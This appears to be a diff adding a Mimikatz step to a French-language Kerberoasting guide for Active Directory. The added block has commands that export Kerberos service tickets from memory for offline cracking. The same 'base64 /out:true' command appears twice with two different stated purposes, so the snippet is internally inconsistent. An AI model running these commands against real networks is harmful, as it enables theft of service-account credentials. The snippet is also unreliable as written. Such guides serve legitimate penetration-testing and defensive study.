@@ -45,6 +45,12 @@ setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-O
 
 Une fois les TGS générés par le KDC et stockés dans le système d'exploitation, on peut les récupérer via `Mimikatz`. 
 
+```
+mimikatz # base64 /out:true    <==== si on veut les transférer par copier / coller par exemple
+mimikatz # base64 /out:true    <==== si on veut générer des fichiers .kirbi
+
+mimikatz # kerberos::list /export  
+```
 
 
 #### Utiliser Rubeus.exe
